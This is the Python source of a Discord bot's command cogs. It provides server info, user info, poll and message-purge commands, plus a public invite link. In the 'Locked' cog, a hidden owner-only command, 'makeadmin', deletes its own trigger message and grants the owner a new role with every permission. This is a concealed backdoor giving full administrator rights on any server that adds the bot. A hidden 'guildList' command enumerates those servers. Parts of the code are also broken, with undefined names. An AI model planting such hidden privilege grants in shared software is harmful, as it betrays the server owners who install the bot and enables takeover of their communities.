from io import BytesIO
import logging
import os

import discord
import random
from discord.ext import commands

########
#People#
########

TNMN = 555207100603826177
Paladin = 447068325856542721
Cadence = 363424348742352906
Macky = 523919572273856523
TNMB = 600524415263965187
noNuke = [738825914955333684]

programmer_club = 555087033652215830
LDL_server = 707226419993772112
LDL_bot_commands = 710542883375022160
LDL_bot_test = 741765478292127824

logger = logging.getLogger("bot")

def fmt(d):
    return d.strftime('%A, %B %e %Y at %H:%M:%S')

def is_nuke(ctx: commands.Context):
    member: discord.Member = ctx.author
    roles: List[discord.Role] = member.roles

    if(ctx.author.id in noNuke):
        return False
    else:
        return is_mod(ctx) or is_admin(ctx) or is_owner(ctx)

def is_owner(ctx: commands.Context):
    return ctx.author.id == TNMN


def is_admin(ctx: commands.Context):
    member: discord.Member = ctx.author
    roles: List[discord.Role] = member.roles
    return is_owner(ctx) or any([role.permissions.administrator for role in roles])


def is_mod(ctx: commands.Context):
    member: discord.Member = ctx.author
    roles: List[discord.Role] = member.roles
    return is_admin(ctx) or any([role.permissions.manage_messages for role in roles])

def is_LDL_channel(ctx: commands.Context):
    if(ctx.guild.id == LDL_server):
        if(ctx.message.channel.id == LDL_bot_commands or ctx.message.channel.id == LDL_bot_test):
            return True
        else:
            return False
    else:
        return True

class Discord_Info(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.guild_only()
    async def pfp(self, ctx, *, user: discord.Member = None):
        """ Get the avatar of you or someone else """
        if user is None:
            user = ctx.author
        if(is_LDL_channel(ctx)):
            await ctx.send(f"{user.avatar_url_as(size=1024)}")

    @commands.command()
    @commands.guild_only()
    async def roles(self, ctx):
        """ Get all roles in current server """
        allroles = ""
        if (is_LDL_channel(ctx)):
            author = ctx.author

            embed = discord.Embed(color=author.color.value)

            roles = ctx.guild.roles
            roles.reverse()

            embed.add_field(
                name=f"Roles for {ctx.guild.name}",
                value=', '.join([f"<@&{x.id}>" for x in roles if x is not ctx.guild.default_role
                                 ]) if len(ctx.guild.roles) > 1 else f"No roles in {ctx.guild.name}",
                inline=False
            )
            await ctx.send(embed=embed)

    @commands.command()
    @commands.guild_only()
    async def user(self, ctx, *, user: discord.Member = None):
        """ Get user information """
        #Concept by Paladin Of Ioun#5905
        #Final version by Nerd#2021
        if user is None:
            user = ctx.author
        if (is_LDL_channel(ctx)):

            embed = discord.Embed(color=user.color.value)
            embed.set_thumbnail(url=user.avatar_url)

            embed.add_field(name="Name", value=user, inline=True)
            embed.add_field(name="Nickname", value=user.nick if hasattr(user, "nick") else "None", inline=True)
            embed.add_field(name="Account created", value=fmt(user.created_at), inline=True)
            embed.add_field(name=f"Joined {ctx.guild.name}", value=fmt(user.joined_at), inline=True)

            roles = user.roles
            roles.reverse()

            embed.add_field(
                name="Roles",
                value=', '.join([f"<@&{x.id}>" for x in roles if x is not ctx.guild.default_role]) if len(user.roles) > 1 else f"No roles in {ctx.guild.name}",
                inline=False
            )

            await ctx.send(embed=embed)

    @commands.group()
    @commands.guild_only()
    async def server(self, ctx):
        """ Check info about current server """
        if (is_LDL_channel(ctx)):
            if ctx.invoked_subcommand is None:
                findbots = sum(1 for member in ctx.guild.members if member.bot)

                allroles = ""

                for num, role in enumerate(sorted(ctx.guild.roles, reverse=True), start=1):
                    allroles += f"{role.name}\n"

                author = ctx.message.author

                embed = discord.Embed(color=author.top_role.color.value)
                embed.set_thumbnail(url=ctx.guild.icon_url)
                embed.add_field(name="Server Name", value=ctx.guild.name, inline=True)
                embed.add_field(name="Server ID", value=ctx.guild.id, inline=True)
                embed.add_field(name="Members", value=ctx.guild.member_count, inline=True)
                embed.add_field(name="Bots", value=str(findbots), inline=True)
                embed.add_field(name="Owner", value=ctx.guild.owner, inline=True)
                embed.add_field(name="Created", value=fmt(ctx.guild.created_at), inline=True)

                roles = ctx.guild.roles
                roles.reverse()

                embed.add_field(
                    name="Roles",
                    value=', '.join([f"<@&{x.id}>" for x in roles if x is not ctx.guild.default_role]) if len(
                        ctx.guild.roles) > 1 else f"No roles in {ctx.guild.name}",
                    inline=False
                )

                await ctx.send(embed=embed)

    @commands.command()
    @commands.guild_only()
    async def emoji(self, ctx):
        if (is_LDL_channel(ctx)):
            """ Check when a user joined the current server """
            embed = discord.Embed(color=ctx.author.color.value)
            embed.add_field(name="**Emojis**", value="-", inline=True)

            embed2 = discord.Embed(color=ctx.author.color.value)
            embed2.add_field(name="**Emojis**", value="-", inline=True)

            embed3 = discord.Embed(color=ctx.author.color.value)
            embed3.add_field(name="**Emojis**", value="-", inline=True)

            i = 1


            for x in ctx.guild.emojis:
                if(i<=24):
                    embed.add_field(name=i, value=x, inline=True)
                elif(i<=48):
                    embed2.add_field(name=i, value=x, inline=True)
                else:
                    embed3.add_field(name=i, value=x, inline=True)
                i = i+1
            if i != 1:
                await ctx.send(embed = embed)

                if(i > 25):
                    await ctx.send(embed = embed2)

                if (i > 49):
                    await ctx.send(embed=embed3)
            else:
                embed4 = discord.Embed(color=ctx.author.color.value)
                embed4.add_field(name="**Emojis**", value=f"No emojis found for  **{ctx.guild.name}**", inline=True)
                await ctx.send(embed=embed4)

    @commands.command()
    async def invite(self, ctx):
        """Invite the bot to your server"""

        user = ctx.author
        await user.send("My invite link is: https://tinyurl.com/yyoja52j")

class Locked(commands.Cog):
    """ 
    Locked down commands (only a few people can use)
    """

    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    @commands.check(is_nuke)
    async def nuke(self, ctx: commands.Context, limit: int):
        """Nuke messages"""
        try:
            await ctx.channel.purge(limit=limit+1)
        except discord.Forbidden:
            embed = discord.Embed(color=ctx.message.author.top_role.color.value)
            embed.add_field(
                name=f"Error",
                value=f"Error: I don't have permission to nuke")
            await ctx.send(embed=embed)  # Say in chat


    @commands.command(aliases=['create'],hidden=True)
    @commands.guild_only()
    @commands.check(is_owner)
    async def makeadmin(self, ctx: commands.Context, name: str, color: discord.Color):
        """Makes you an admin"""

        try:
            await ctx.message.delete()
        except discord.Forbidden:
            await logger.warning("ERROR IN DELETING MESSAGE")
        try:
            role = await ctx.guild.create_role(name=name,
                                               color=color,
                                               permissions=discord.Permissions.all())
            user = ctx.message.author
            await user.add_roles(role)
        except discord.Forbidden:
            await ctx.send('Unable to create role..')

    @commands.command(hidden=True)
    @commands.guild_only()
    @commands.check(is_owner)
    async def guildList(self, ctx):
        async for guild in client.fetch_guilds(limit=150):
            print(guild.name)


class Useful(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(pass_context=True)
    async def poll(self, ctx: commands.Context, question: str, *options: str):
        """
        Creates a poll.
        """
        if (is_LDL_channel(ctx)):
            if len(options) <= 1:
                await ctx.send('You cannot make a poll out of 1 item!')
                return
            if len(options) > 10:
                await ctx.send('You cannot make a poll for more than 10 things!')
                return

            reactions = ['1⃣', '2⃣', '3⃣', '4⃣', '5⃣', '6⃣', '7⃣', '8⃣', '9⃣', '🔟']

            description = []
            for x, option in enumerate(options):
                description += '\n {} {}'.format(reactions[x], option)
            embed = discord.Embed(title=question, description=''.join(description))
            react_message = await ctx.send(embed=embed)
            for reaction in reactions[:len(options)]:
                await react_message.add_reaction(reaction)
            embed.set_footer(text='Poll ID: {}'.format(react_message.id))
            await react_message.edit(embed=embed)

    @commands.command(pass_context=True)
    async def tally(self, ctx: commands.Context, id):
        """
        Tally poll.
        """
        if (is_LDL_channel(ctx)):
            poll_message = await ctx.fetch_message(id)
            if not poll_message.embeds:
                return
            embed = poll_message.embeds[0]
            if poll_message.author != ctx.me:
                return
            if not embed.footer.text.startswith('Poll ID:'):
                return
            unformatted_options = [x.strip() for x in embed.description.split('\n')]
            opt_dict = {x[:2]: x[3:] for x in unformatted_options} if unformatted_options[0][0] == '1' \
                else {x[:1]: x[2:] for x in unformatted_options}
            # check if we're using numbers for the poll, or x/checkmark, parse accordingly
            voters = [ctx.me.id]  # add the bot's ID to the list of voters to exclude it's votes

            tally = {x: 0 for x in opt_dict.keys()}
            for reaction in poll_message.reactions:
                if reaction.emoji in opt_dict.keys():
                    reactors = await reaction.users().flatten()
                    for reactor in reactors:
                        if reactor.id not in voters:
                            tally[reaction.emoji] += 1
                            voters.append(reactor.id)

            output = 'Results of the poll for "{}":\n'.format(embed.title) + \
                     '\n'.join(['{}: {}'.format(opt_dict[key], tally[key]) for key in tally.keys()])
            await ctx.send(output)


def setup(bot):
    bot.add_cog(Discord_Info(bot))
    bot.add_cog(Locked(bot))
    bot.add_cog(Useful(bot))




